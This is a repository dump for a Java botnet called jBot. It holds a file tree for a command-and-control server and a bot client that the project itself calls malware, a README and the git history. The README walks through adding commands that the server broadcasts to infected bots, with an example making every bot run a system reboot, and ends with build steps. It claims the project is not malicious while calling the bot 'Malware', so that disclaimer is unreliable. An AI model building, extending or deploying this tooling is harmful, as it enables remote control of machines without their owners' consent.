======================: FILES :======================
jBot
├── jBot - Command and Control
│   ├── pom.xml
│   └── src
│       └── main
│           └── java
│               └── me
│                   └── aaronakhtar
│                       └── jbot
│                           ├── command_manager
│                           │   ├── commands
│                           │   │   ├── BotsCommand.java
│                           │   │   ├── ExampleCommand.java
│                           │   │   ├── HelpCommand.java
│                           │   │   └── PongCommand.java
│                           │   └── JBotCommand.java
│                           ├── crypto
│                           │   └── Aes.java
│                           ├── file_manager
│                           │   ├── ConfigFile.java
│                           │   ├── config_files
│                           │   │   └── DefaultConfigurationFile.java
│                           │   └── files
│                           │       └── AccessKeysFile.java
│                           ├── Main.java
│                           ├── objects
│                           │   ├── Bot.java
│                           │   └── ConnectionType.java
│                           ├── threads
│                           │   ├── BotCheckerThread.java
│                           │   ├── DynamicTitleThread.java
│                           │   ├── handlers
│                           │   │   ├── BotHandler.java
│                           │   │   └── ClientHandler.java
│                           │   ├── servers
│                           │   │   ├── BotServerThread.java
│                           │   │   └── ClientServerThread.java
│                           │   └── ShutdownThread.java
│                           └── Utilities.java
├── jBot - Malware Bot
│   ├── pom.xml
│   └── src
│       └── main
│           └── java
│               └── me
│                   └── aaronakhtar
│                       └── jbot
│                           ├── Aes.java
│                           └── Main.java
└── README.md

24 directories, 25 files
======================: README CONTENT :======================
*is jBot Malicious? No. jBot is an implementation of a Botnet in Java that was designed for developers to create their own botnets, as botnets are the future of large-scale computing, botnets are used widely across the world for many different things, and are used by some of your favorite companies.*
# jBot
jBot is the future of Java Botnet Development, the developed software allows java developers to create their own botnet, by adding commands, and more functionality to the initial botnet, as it was developed with ease of development in mind for less 'inclined' developers (No Offence).

## Get Started >
Begin by cloning/downloading this GitHub Repository, this will give you access to the Botnet Malware (Bot), and the Botnet Command and Control (CNC) Servers/Software.

    $ git clone https://github.com/Aaron-Akhtar/jBot.git

You can then process the projects into your code editor, and begin adding some custom commands and functionality to the botnet, as seen below.

### Adding Custom Commands and Functionality >
jBot uses something called Reflections, this allows the (CNC) software to dynamically find commands you've added to the project, so there is literally one 1 file/class that needs to be made and modified for you to add a custom command to the initial CNC Software, however you will need to add functionality for the actual bots (If your command is sending data to the bots), because, if you don't, the bots won't know what to do.

Start by Creating a Class & Implementing the interface [JBotCommand.java](https://github.com/Aaron-Akhtar/jBot/blob/main/jBot%20-%20Command%20and%20Control/src/main/java/me/aaronakhtar/jbot/command_manager/JBotCommand.java). 
**MAKE SURE TO LOCATE YOUR NEW COMMAND CLASS INTO THE FOLLOWING PROJECT PACKAGE/DIRECTORY:** `me.aaronakhtar.jbot.command_manager.commands`
Example Command Class:

```java
package me.aaronakhtar.jbot.command_manager.commands;  
  
import me.aaronakhtar.jbot.command_manager.JBotCommand;  
import me.aaronakhtar.jbot.threads.handlers.ClientHandler;  
  
import java.io.BufferedReader;  
import java.io.BufferedWriter;  
  
public class RandomCommand implements JBotCommand {  
  
    @Override  
  public String getCommand() {  
        return "myCommand";  
  }  
  
    @Override  
  public String getDescription() {  
        return "use this command to send a virtual slap to all bots.";  
  }  
  
    @Override  
  public boolean isAdminCommand() {  
        return false;  
  }  
  
    @Override  
  public void doAction(String[] args, ClientHandler client, BufferedWriter out, BufferedReader in) throws Exception {  
        // do something here when CNC-CLIENT executes command.  
  }  
}
```
If your command has **NO BOT-FUNCTIONALITY**, then, congrats, you've made your first CNC Command.
Whenever a CNC-CLIENT executes your command, whatever is in `doAction(...)` will be executed.

### Integrating your new command with your Bot (Malware) >
Because of the ease-of-usage concept I want to go by, I decided to make the Malware simple, and not over complicated at all, in order to integrate your new command, simply **make sure you add the following code into your Command Class `doAction(...)` function in the CNC Software:  `Utilities.executeCommandToNetwork("command here");`**

In your Malware [Main.java](https://github.com/Aaron-Akhtar/jBot/blob/main/jBot%20-%20Malware%20Bot/src/main/java/me/aaronakhtar/jbot/Main.java) class, simply modify the switch-statement to integrate your new command, and provide some functionality, below is an example implementation:
```java
switch (commandArgs[0].toLowerCase(Locale.ROOT)){  
    // example  
  case "ping":{  
     System.out.println("pong");  
     break;  
  }  
  
  case "myCommand":{  
     Runtime.getRuntime().exec("reboot");  
     break;  
  }  
}
```
As you can see, we are executing the `reboot` command in all the bots on our network once receiving the new command we just added to our CNC.


## Compiling the Software >
Once you've modified your version of jBot, you can compile it with Git Bash using the following commands:
*Prerequisites*:
```
	- Apache Maven (Installation Tutorial > https://www.youtube.com/watch?v=km3tLti4TCM)
```
*Step 1*: Go into your CNC Project Folder (The folder with `pom.xml` in it) and execute the following command:
```
$ mvn clean package
```
or
```
mvn package
```
*Step 2*: Go into your Malware (Bot) Project Folder (The folder with `pom.xml` in it) and execute the following command:
```
$ mvn clean package
```
or
```
mvn package
```

**Ladies and Gentlemen**, that is how you create a damn Java Botnet.

# Credits:
Me.
https://twitter.com/D3vAaron
====================== GIT HISTORY: ======================
f1413ae HEAD@{0}: clone: from https://github.com/Aaron-Akhtar/jBot
commit f1413aeb503b9f3ee3ca44e5723e5bfc655c3681
Author: Aaron-Akhtar <contact@aaronakhtar.me>
Date:   Mon Dec 13 17:42:21 2021 +0000

    added shutdown hook and optimized client handler

commit 844fc5ecbcd2b439b38b67899d5f8b052e98d497
Author: Aaron-Akhtar <contact@aaronakhtar.me>
Date:   Mon Dec 6 07:02:15 2021 +0000

    removing bin dirs

commit 0e55d85f3177314b7de3453e1277a6f545a1351d
Author: Aaron-Akhtar <contact@aaronakhtar.me>
Date:   Mon Dec 6 07:01:43 2021 +0000

    removing bin dirs

commit 90c1afd752b6b9349a45a04bdf2bcc90a1cfe2f4
Author: Aaron-Akhtar <contact@aaronakhtar.me>
Date:   Mon Dec 6 07:00:57 2021 +0000

    removing bin dirs

commit f751de710d4ccc46697fbc4bfd835330e3f21c1b
Author: Aaron-Akhtar <contact@aaronakhtar.me>
Date:   Mon Dec 6 07:00:00 2021 +0000

    Fixed reconnection after disconnection issue and added dynamic terminal name

commit 16617dbab046893e9b21fb771edc96ad0e508c80
Author: Aaron <media@aaronakhtar.me>
Date:   Thu Oct 14 04:07:00 2021 +0100

    Removed soTimeout from bot socket

commit 521de7455ea344ac2fe1c0fa63f9097001c59095
Author: Aaron <media@aaronakhtar.me>
Date:   Fri Sep 17 23:19:01 2021 +0100

    Fixed Socketing Issues

commit 29ecb717fb962b448081c61148a6420bc2e96d4e
Author: Aaron <media@aaronakhtar.me>
Date:   Fri Aug 13 17:10:18 2021 +0100

    Initial Development Commit #5

commit 78a21bc0d19dfe2a353a5951c9134949bf5af425
Author: Aaron <media@aaronakhtar.me>
Date:   Fri Aug 13 17:09:21 2021 +0100

    Initial Development Commit #5

commit c0f1941602f77b73eb42813c4cde0e9e26601aa3
Author: Aaron <media@aaronakhtar.me>
Date:   Tue Aug 10 09:51:02 2021 +0100

    Initial Development Commit #4 (Malware Implementation)

commit f59d84e593532966e2f59722df0b41bccf8599ff
Author: Aaron <media@aaronakhtar.me>
Date:   Tue Aug 10 09:49:52 2021 +0100

    Initial Development Commit #4 (Malware Implementation)

commit d596d17b7213c7c716a7cb162bb4f2c41d34f844
Author: Aaron <media@aaronakhtar.me>
Date:   Tue Aug 10 08:50:56 2021 +0100

    Initial Development Commit #3

commit 634e508761ba612db21905d3c2402f491d74c8c9
Author: Aaron <media@aaronakhtar.me>
Date:   Sun Aug 8 11:05:38 2021 +0100

    Initial Development Commit #2

commit d6bf8a282366a660adced2a94891cfc48620237a
Author: Aaron <media@aaronakhtar.me>
Date:   Wed Aug 4 05:56:46 2021 +0100

    Initial Development Commit #1

commit ef5947f4f1051f6f18a9111212e1f1e737e7cd03
Author: Aaron <media@aaronakhtar.me>
Date:   Wed Aug 4 05:55:59 2021 +0100

    Initial Development Commit #1

commit 37b7ce69240d9e08140ccd80dd1c8778f1e61b1f
Author: Aaron <media@aaronakhtar.me>
Date:   Mon Aug 2 23:46:31 2021 +0100

    jBot Malware & CNC initial commit (PRE-DEV)
